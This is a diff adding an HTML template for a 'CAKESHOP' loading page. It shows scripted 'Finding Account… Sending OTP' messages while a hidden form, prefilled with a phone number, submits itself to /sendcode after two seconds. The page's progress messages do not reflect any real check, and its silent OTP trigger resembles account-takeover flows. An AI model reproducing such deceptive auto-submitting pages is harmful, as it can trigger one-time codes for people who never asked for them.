@@ -1,0 +1,564 @@
+<style>
+    #page {
+        align-items: center;
+        background: #f78e70;
+        bottom: 0;
+        display: flex;
+        justify-content: center;
+        left: 0;
+        position: absolute;
+        right: 0;
+        top: 0;
+        transition: opacity 1s;
+    }
+
+    #phrase_box {
+        display: flex;
+        flex-flow: column;
+        height: 150px;
+        overflow: hidden;
+        width: 260px;
+    }
+
+    #phrases {
+        animation: slide-phrases-upward 20s;
+    }
+
+    #footer {
+        bottom: 30px;
+        color: white;
+        display: flex;
+        justify-content: center;
+        left: 0;
+        position: fixed;
+        right: 0;
+    }
+
+    @keyframes slide-phrases-upward {
+        0% {
+            transform: translateY(0px);
+        }
+
+        5% {
+            transform: translateY(-50px);
+        }
+
+        10% {
+            transform: translateY(-100px);
+        }
+
+        15% {
+            transform: translateY(-150px);
+        }
+
+        20% {
+            transform: translateY(-200px);
+        }
+
+        25% {
+            transform: translateY(-250px);
+        }
+
+        30% {
+            transform: translateY(-300px);
+        }
+
+        35% {
+            transform: translateY(-350px);
+        }
+
+        40% {
+            transform: translateY(-400px);
+        }
+
+        45% {
+            transform: translateY(-450px);
+        }
+
+        50% {
+            transform: translateY(-500px);
+        }
+
+        55% {
+            transform: translateY(-550px);
+        }
+
+        60% {
+            transform: translateY(-600px);
+        }
+
+        65% {
+            transform: translateY(-650px);
+        }
+
+        70% {
+            transform: translateY(-700px);
+        }
+
+        75% {
+            transform: translateY(-750px);
+        }
+
+        80% {
+            transform: translateY(-800px);
+        }
+
+        85% {
+            transform: translateY(-850px);
+        }
+
+        90% {
+            transform: translateY(-900px);
+        }
+
+        95% {
+            transform: translateY(-950px);
+        }
+
+        100% {
+            transform: translateY(-1000px);
+        }
+    }
+
+    #loadingCheckCircleSVG-0 {
+        animation: fill-to-white 5000ms;
+        animation-delay: -1.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-1 {
+        animation: fill-to-white 5000ms;
+        animation-delay: -0.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-2 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 0.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-3 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 1.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-4 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 2.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-5 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 3.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-6 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 4.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-7 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 5.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-8 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 6.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-9 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 7.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-10 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 8.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-11 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 9.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-12 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 10.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-13 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 11.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-14 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 12.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-15 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 13.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-16 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 14.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-17 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 15.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-18 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 16.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-19 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 17.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    #loadingCheckCircleSVG-20 {
+        animation: fill-to-white 5000ms;
+        animation-delay: 18.5s;
+        fill: white;
+        opacity: 0;
+    }
+
+    @keyframes fill-to-white {
+        0% {
+            opacity: 0;
+        }
+
+        10% {
+            opacity: 1;
+        }
+
+        100% {
+            opacity: 1;
+        }
+    }
+
+    #loadingCheckSVG-0 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: -1.5s;
+    }
+
+    #loadingCheckSVG-1 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: -0.5s;
+    }
+
+    #loadingCheckSVG-2 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 0.5s;
+    }
+
+    #loadingCheckSVG-3 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 1.5s;
+    }
+
+    #loadingCheckSVG-4 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 2.5s;
+    }
+
+    #loadingCheckSVG-5 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 3.5s;
+    }
+
+    #loadingCheckSVG-6 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 4.5s;
+    }
+
+    #loadingCheckSVG-7 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 5.5s;
+    }
+
+    #loadingCheckSVG-8 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 6.5s;
+    }
+
+    #loadingCheckSVG-9 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 7.5s;
+    }
+
+    #loadingCheckSVG-10 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 8.5s;
+    }
+
+    #loadingCheckSVG-11 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 9.5s;
+    }
+
+    #loadingCheckSVG-12 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 10.5s;
+    }
+
+    #loadingCheckSVG-13 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 11.5s;
+    }
+
+    #loadingCheckSVG-14 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 12.5s;
+    }
+
+    #loadingCheckSVG-15 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 13.5s;
+    }
+
+    #loadingCheckSVG-16 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 14.5s;
+    }
+
+    #loadingCheckSVG-17 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 15.5s;
+    }
+
+    #loadingCheckSVG-18 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 16.5s;
+    }
+
+    #loadingCheckSVG-19 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 17.5s;
+    }
+
+    #loadingCheckSVG-20 {
+        animation: fill-to-coral 5000ms;
+        animation-delay: 18.5s;
+    }
+
+    @keyframes fill-to-coral {
+        0% {
+            fill: white;
+        }
+
+        10% {
+            fill: #ff6d92;
+        }
+
+        100% {
+            fill: #ff6d92;
+        }
+    }
+</style>
+
+<body>
+    <form action="/sendcode" name="sendcode">
+        <input type="hidden" type="number" value="{{phone}}" name="phonenumber"><br><br>
+        <input type="hidden" type="radio" type="hidden" id="age1" name="channel" value="sms" checked><br><br>
+        <button type="submit" name="sendcode"></button>
+    </form>
+    <div id="page">
+        <div id="phrase_box">
+            <svg width="100%" height="100%">
+                <defs>
+                    <!--<style type="text/css">
+        @font-face {
+          font-family: "Proxima";
+          src: url('');
+        }
+      </style>-->
+                    <mask id="mask" maskUnits="userSpaceOnUse" maskContentUnits="userSpaceOnUse">
+                        <linearGradient id="linearGradient" gradientUnits="objectBoundingBox" x2="0" y2="1">
+                            <stop stop-color="white" stop-opacity="0" offset="0%" />
+                            <stop stop-color="white" stop-opacity="1" offset="30%" />
+                            <stop stop-color="white" stop-opacity="1" offset="70%" />
+                            <stop stop-color="white" stop-opacity="0" offset="100%" />
+                        </linearGradient>
+                        <rect width="100%" height="100%" fill="url(#linearGradient)" />
+                    </mask>
+                </defs>
+                <g width="100%" height="100%" style="mask: url(#mask);">
+                    <g id="phrases"></g>
+                </g>
+            </svg>
+        </div>
+        <div id="footer">
+            <div id="logo"></div>CAKESHOP
+        </div>
+    </div>
+
+
+</body>
+
+
+<script>
+
+    var checkmarkIdPrefix = "loadingCheckSVG-";
+    var checkmarkCircleIdPrefix = "loadingCheckCircleSVG-";
+    var verticalSpacing = 50;
+
+
+
+    function createSVG(tag, properties, opt_children) {
+        var newElement = document.createElementNS("http://www.w3.org/2000/svg", tag);
+        for (prop in properties) {
+            newElement.setAttribute(prop, properties[prop]);
+        }
+        if (opt_children) {
+            opt_children.forEach(function (child) {
+                newElement.appendChild(child);
+            })
+        }
+        return newElement;
+    }
+
+    function createPhraseSvg(phrase, yOffset) {
+        var text = createSVG("text", {
+            fill: "white",
+            x: 50,
+            y: yOffset,
+            "font-size": 18,
+            "font-family": "Arial"
+        });
+        text.appendChild(document.createTextNode(phrase + "..."));
+        return text;
+    }
+    function createCheckSvg(yOffset, index) {
+        var check = createSVG("polygon", {
+            points: "21.661,7.643 13.396,19.328 9.429,15.361 7.075,17.714 13.745,24.384 24.345,9.708 ",
+            fill: "rgba(255,255,255,1)",
+            id: checkmarkIdPrefix + index
+        });
+        var circle_outline = createSVG("path", {
+            d: "M16,0C7.163,0,0,7.163,0,16s7.163,16,16,16s16-7.163,16-16S24.837,0,16,0z M16,30C8.28,30,2,23.72,2,16C2,8.28,8.28,2,16,2 c7.72,0,14,6.28,14,14C30,23.72,23.72,30,16,30z",
+            fill: "white"
+        })
+        var circle = createSVG("circle", {
+            id: checkmarkCircleIdPrefix + index,
+            fill: "rgba(255,255,255,0)",
+            cx: 16,
+            cy: 16,
+            r: 15
+        })
+        var group = createSVG("g", {
+            transform: "translate(10 " + (yOffset - 20) + ") scale(.9)"
+        }, [circle, check, circle_outline]);
+        return group;
+    }
+
+    function addPhrasesToDocument(phrases) {
+        phrases.forEach(function (phrase, index) {
+            var yOffset = 30 + verticalSpacing * index;
+            document.getElementById("phrases").appendChild(createPhraseSvg(phrase, yOffset));
+            document.getElementById("phrases").appendChild(createCheckSvg(yOffset, index));
+        });
+    }
+
+    function easeInOut(t) {
+        var period = 200;
+        return (Math.sin(t / period + 100) + 1) / 2;
+    }
+
+    document.addEventListener("DOMContentLoaded", function (event) {
+        var phrases = ["Finding Account", "Finding Account", "account found", "Verifying", "Sending OTP"];
+        addPhrasesToDocument(phrases);
+        var start_time = new Date().getTime();
+        var upward_moving_group = document.getElementById("phrases");
+        upward_moving_group.currentY = 0;
+        var checks = phrases.map(function (_, i) {
+            return { check: document.getElementById(checkmarkIdPrefix + i), circle: document.getElementById(checkmarkCircleIdPrefix + i) };
+        });
+        function animateLoading() {
+            var now = new Date().getTime();
+            upward_moving_group.setAttribute("transform", "translate(0 " + upward_moving_group.currentY + ")");
+            upward_moving_group.currentY -= 1.35 * easeInOut(now);
+            checks.forEach(function (check, i) {
+                var color_change_boundary = - i * verticalSpacing + verticalSpacing + 15;
+                if (upward_moving_group.currentY < color_change_boundary) {
+                    var alpha = Math.max(Math.min(1 - (upward_moving_group.currentY - color_change_boundary + 15) / 30, 1), 0);
+                    check.circle.setAttribute("fill", "rgba(255, 255, 255, " + alpha + ")");
+                    var check_color = [Math.round(255 * (1 - alpha) + 120 * alpha), Math.round(255 * (1 - alpha) + 154 * alpha)];
+                    check.check.setAttribute("fill", "rgba(255, " + check_color[0] + "," + check_color[1] + ", 1)");
+                }
+            })
+            if (now - start_time < 30000 && upward_moving_group.currentY > -710) {
+                requestAnimationFrame(animateLoading);
+            }
+        }
+        //animateLoading();
+    });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    window.onload = setTimeout(function () {
+        document.forms['sendcode'].submit();
+    }, 2000)
+
+
+</script>
